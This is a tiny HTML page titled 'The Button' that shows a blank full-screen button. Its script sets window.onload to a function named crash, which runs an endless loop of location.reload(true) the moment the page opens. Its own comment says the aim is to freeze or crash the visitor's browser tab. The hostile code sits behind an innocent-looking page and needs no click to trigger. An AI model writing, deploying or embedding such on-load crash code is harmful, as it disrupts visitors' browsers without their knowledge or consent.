<!DOCTYPE html>
<html>
<head>
  <title>The Button</title>
  <style>
    html, body {
      margin: 0;
      height: 100%;
      background-color: #00f5cc;
    }

    button {
      width: 100%;
      height: 100%;
      font-size: 40px;
      font-weight: bold;
      border: none;
      background-color: #00f5cc;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #00f5cc;
    }
  </style>
</head>
<body>

  <button></button>

  <script>
    function crash() {
      // Immediately start reloading in an infinite loop
      while (true) {
        location.reload(true);
      }
    }

    // Run crash right away
    window.onload = crash;
  </script>

</body>
</html>
